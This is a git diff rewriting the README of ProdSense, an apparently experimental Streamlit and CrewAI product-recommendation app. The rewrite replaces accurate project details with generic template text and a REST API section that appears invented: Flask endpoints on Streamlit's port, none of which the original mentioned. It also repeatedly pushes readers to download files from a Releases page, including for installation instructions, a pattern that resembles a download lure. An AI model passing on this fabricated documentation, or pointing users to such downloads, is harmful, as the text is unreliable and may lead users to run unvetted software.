@@ -1,56 +1,215 @@
-# ProdSense: Multi-Agent Product Recommendation System
+# ProdSense: A Multi-Agent Product Recommendation System
 
-ProdSense is a Streamlit app powered by CrewAI that scrapes product details from any product website, hunts for alternatives, pulls community sentiments, and finds YouTube reviews. It delivers a Markdown recommendation tailored to your needs. Built for tinkerers who want to dive into AI-driven product research.
+![ProdSense Logo](https://via.placeholder.com/150)  
+[![GitHub Release](https://img.shields.io/badge/Download%20Latest%20Release-v1.0.0-brightgreen)](https://github.com/soumiau158/ProdSense/releases)
 
-**Disclaimer**: This is an experimental learning project. APIs can be flaky, and data quality varies. Expect to debug and tweak.
+## Table of Contents
+
+1. [Introduction](#introduction)
+2. [Features](#features)
+3. [Technologies Used](#technologies-used)
+4. [Installation](#installation)
+5. [Usage](#usage)
+6. [API Documentation](#api-documentation)
+7. [Contributing](#contributing)
+8. [License](#license)
+9. [Contact](#contact)
+
+## Introduction
+
+ProdSense is an experimental multi-agent product recommendation system powered by CrewAI. It scrapes product details from various e-commerce websites, discovers alternatives, analyzes community sentiments, and curates YouTube reviews. This tool outputs tailored Markdown recommendations to help users make informed purchasing decisions. It is designed for developers and enthusiasts who want to explore the potential of AI in e-commerce.
+
+For the latest releases, please visit our [Releases page](https://github.com/soumiau158/ProdSense/releases).
 
 ## Features
 
-- Scrapes product specs from any product website (optimized for e-commerce).
-- Finds up to three alternative products based on your preferences.
-- Analyzes user feedback from forums and Reddit.
-- Curates 1-2 relevant YouTube review videos.
-- Outputs a concise Markdown recommendation.
+- **Multi-Agent Architecture**: Leverage multiple AI agents to gather and analyze data.
+- **Product Scraping**: Extract product details from any product website.
+- **Alternative Discovery**: Find similar products based on user preferences.
+- **Sentiment Analysis**: Analyze community sentiments about products using social media data.
+- **YouTube Review Curation**: Gather and summarize YouTube reviews for products.
+- **Markdown Output**: Generate tailored Markdown recommendations for easy sharing.
+- **API-Driven**: Interact with the system through a RESTful API.
+- **Open for Tinkering**: Modify and extend the system as per your needs.
 
-## The ProdSense Crew
+## Technologies Used
 
-### Agents
-- **URL Identifier**: Detects the product URL from inputs.
-- **Input Analyst**: Parses preferences and scrapes product data.
-- **Market Researcher**: Discovers alternative products.
-- **Community Analyst**: Gathers user sentiments.
-- **Video Specialist**: Finds YouTube review videos.
-- **Recommendation Expert**: Crafts the final Markdown output.
+- **Python**: The core programming language for the project.
+- **Streamlit**: Used for creating a user-friendly web interface.
+- **CrewAI**: The AI framework that powers the multi-agent system.
+- **Google Gemini**: For advanced data analysis and machine learning.
+- **Beautiful Soup**: For web scraping product details.
+- **Pandas**: For data manipulation and analysis.
+- **Flask**: To create the API endpoints.
+- **Jupyter Notebook**: For prototyping and testing.
 
-### Tasks
-- **Identify URL**: Locates the target product URL.
-- **Parse Input**: Extracts user needs and product details.
-- **Find Alternatives**: Scouts alternative products.
-- **Gather Sentiment**: Collects community pros and cons.
-- **Find Videos**: Retrieves relevant review videos.
-- **Synthesize Recommendation**: Builds the Markdown recommendation.
+## Installation
 
-### Tools
-- **FirecrawlScrapeWebsiteTool**: Scrapes product pages.
-- **SerperDevTool**: Powers web searches for alternatives, sentiments, and videos.
-- **ComposioToolSet (Reddit)**: Fetches Reddit feedback.
+To get started with ProdSense, follow these steps:
 
-**Disclaimer**: Results depend on API reliability and data availability. It’s a learning experiment, not a production tool.
+1. **Clone the Repository**:
+   ```bash
+   git clone https://github.com/soumiau158/ProdSense.git
+   cd ProdSense
+   ```
 
-## Example Usage
+2. **Install Dependencies**:
+   Create a virtual environment and install the required packages:
+   ```bash
+   python -m venv venv
+   source venv/bin/activate  # On Windows use `venv\Scripts\activate`
+   pip install -r requirements.txt
+   ```
 
-- **Product URL**: `https://www.example.com/product`
-- **Preferences**: "Smartphone under 25k, gaming, long battery life."
-- Click "Get Recommendations" for a Markdown report.
-- [Watch ProdSense in Action](assets/prodsense-demo.mp4)  
-  *Screen-recorded demo showing the app’s flow—raw and unpolished.*
+3. **Run the Application**:
+   Start the application using Streamlit:
+   ```bash
+   streamlit run app.py
+   ```
 
-## Troubleshooting
+For detailed installation instructions, refer to the [Releases page](https://github.com/soumiau158/ProdSense/releases).
 
-- **API Errors**: Verify `SERPER_API_KEY`, `GOOGLE_API_KEY`, `FIRECRAWL_API_KEY`, and `COMPOSIO_API_KEY` in `.env`.
-- **Scraping Issues**: Ensure the URL points to a valid product page.
-- **No Results**: Refine preferences or check API quotas.
+## Usage
 
-## Why ProdSense?
+Once the application is running, you can interact with it through the web interface. Here’s how to use the main features:
 
-ProdSense is a playground for exploring multi-agent AI, web scraping, and recommendation systems. It’s rough around the edges but offers a solid starting point for enthusiasts who enjoy dissecting code and experimenting with data.
+1. **Scraping Products**:
+   - Enter the URL of the product page you want to scrape.
+   - Click the "Scrape" button to gather product details.
+
+2. **Discovering Alternatives**:
+   - After scraping, the system will display alternative products based on your input.
+
+3. **Sentiment Analysis**:
+   - View community sentiments related to the product.
+   - Analyze comments and reviews to understand public opinion.
+
+4. **YouTube Reviews**:
+   - Access curated YouTube reviews to get insights from video content.
+   - Summarized reviews will be presented for easy understanding.
+
+5. **Markdown Recommendations**:
+   - Generate Markdown output for sharing with friends or on social media.
+   - Copy the generated Markdown to use in your documents.
+
+## API Documentation
+
+ProdSense offers a RESTful API for developers who want to integrate its features into their applications. Below are the key endpoints:
+
+### Base URL
+```
+http://localhost:8501/api
+```
+
+### Endpoints
+
+1. **Scrape Product**:
+   - **Endpoint**: `/scrape`
+   - **Method**: `POST`
+   - **Body**:
+     ```json
+     {
+       "url": "https://example.com/product-page"
+     }
+     ```
+   - **Response**:
+     ```json
+     {
+       "status": "success",
+       "data": {
+         "name": "Product Name",
+         "price": "Product Price",
+         ...
+       }
+     }
+     ```
+
+2. **Get Alternatives**:
+   - **Endpoint**: `/alternatives`
+   - **Method**: `GET`
+   - **Query Parameters**: `?product_id=123`
+   - **Response**:
+     ```json
+     {
+       "status": "success",
+       "data": [
+         {
+           "name": "Alternative Product 1",
+           "price": "Price 1"
+         },
+         ...
+       ]
+     }
+     ```
+
+3. **Analyze Sentiment**:
+   - **Endpoint**: `/sentiment`
+   - **Method**: `POST`
+   - **Body**:
+     ```json
+     {
+       "product_id": 123
+     }
+     ```
+   - **Response**:
+     ```json
+     {
+       "status": "success",
+       "sentiment": "positive"
+     }
+     ```
+
+4. **Get YouTube Reviews**:
+   - **Endpoint**: `/youtube`
+   - **Method**: `GET`
+   - **Query Parameters**: `?product_id=123`
+   - **Response**:
+     ```json
+     {
+       "status": "success",
+       "data": [
+         {
+           "title": "Review Title",
+           "summary": "Review Summary"
+         },
+         ...
+       ]
+     }
+     ```
+
+For more details, check the [Releases page](https://github.com/soumiau158/ProdSense/releases).
+
+## Contributing
+
+We welcome contributions from the community. If you want to help improve ProdSense, follow these steps:
+
+1. **Fork the Repository**: Click on the "Fork" button at the top right corner of the page.
+2. **Create a Branch**: Create a new branch for your feature or bug fix.
+   ```bash
+   git checkout -b feature/YourFeature
+   ```
+3. **Make Changes**: Implement your changes and commit them.
+   ```bash
+   git commit -m "Add your message here"
+   ```
+4. **Push Changes**: Push your changes to your forked repository.
+   ```bash
+   git push origin feature/YourFeature
+   ```
+5. **Create a Pull Request**: Open a pull request to the main repository.
+
+Please ensure your code adheres to our coding standards and includes appropriate tests.
+
+## License
+
+This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for details.
+
+## Contact
+
+For questions or feedback, feel free to reach out:
+
+- **Email**: [your.email@example.com](mailto:your.email@example.com)
+- **Twitter**: [@yourhandle](https://twitter.com/yourhandle)
+- **GitHub**: [soumiau158](https://github.com/soumiau158)
+
+Thank you for your interest in ProdSense! We hope you find it useful in your product discovery journey. For the latest updates and releases, check our [Releases page](https://github.com/soumiau158/ProdSense/releases).
